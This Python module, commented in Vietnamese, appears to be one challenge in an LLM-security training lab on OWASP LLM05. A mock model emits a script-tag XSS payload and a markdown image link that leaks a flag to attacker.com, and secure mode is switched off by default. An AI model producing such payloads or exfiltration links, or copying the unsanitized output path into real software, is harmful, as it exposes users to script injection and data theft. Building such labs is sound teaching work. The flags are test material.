import html
import re

OWASP_CATEGORY = "LLM05 - Improper Output Handling"
CHALLENGE_ID = "LLM05"
TITLE = "Improper Output Handling (XSS & Markdown Leak)"
DEFAULT_PROMPT = "<script>alert('XSS_ATTACK');</script>"

# Cấu hình cờ phòng thủ hệ thống của Valut (Default: False để Red Team test ra EXPLOIT)
IS_SECURE_MODE = False

def mock_llm_generate_response(user_prompt):
    """
    THUẬT TOÁN 1: Sinh dữ liệu đầu ra thô từ LLM (Mô phỏng LLM nhả mã độc)
    """
    text = user_prompt.lower().strip()
    
    # 1. Kịch bản XSS Attack
    if any(kw in text for kw in ["script", "alert", "<script>", "javascript:"]):
        return f"Here is your requested preview: <script>alert('FLAG{{llm05_improper_output_handling_xss_2026}}')</script>"
        
    # 2. Kịch bản Markdown Image Exfiltration
    if any(kw in text for kw in ["markdown", "image", "img", "!["]):
        return f"Processing complete. ![Data Exfiltration](http://attacker.com/leak?data=FLAG{{llm05_markdown_leak}})"

    return f"I am a helpful assistant. Output preview: {user_prompt}"

def sanitize_output(raw_text):
    """
    THUẬT TOÁN 2: Bộ lọc làm sạch đầu ra (Output Sanitization Engine)
    """
    # Bước 2.1: Vô hiệu hóa nhúng ảnh Markdown độc hại bằng Regex
    markdown_pattern = r"!\[(.*?)\]\((.*?)\)"
    cleaned_text = re.sub(markdown_pattern, r"[Blocked Image Link: \1](\2)", raw_text)
    
    # Bước 2.2: Mã hóa ký tự HTML (Escape HTML entities) để triệt hạ XSS
    escaped_text = html.escape(cleaned_text)
    return escaped_text

def process_message(user_input):
    """
    THUẬT TOÁN 3: Điều hướng xử lý dựa trên cấu hình Bảo mật của Hệ thống
    """
    if not isinstance(user_input, str):
        user_input = str(user_input)
        
    # Bước 1: Cho LLM sinh kết quả thô
    raw_llm_output = mock_llm_generate_response(user_input)

    # Bước 2: Kiểm tra thuật toán phòng thủ đầu ra
    if IS_SECURE_MODE:
        # Nếu đã bật phòng thủ -> Bắt buộc Sanitize đầu ra
        safe_output = sanitize_output(raw_llm_output)
        return f"🚨 [SECURE OUTPUT - ESCAPED]: {safe_output}"
    else:
        # Nếu chưa bật phòng thủ -> Trả về mã thô (Bị lỗ hổng XSS)
        return f"🔓 [VULNERABLE OUTPUT]: {raw_llm_output}"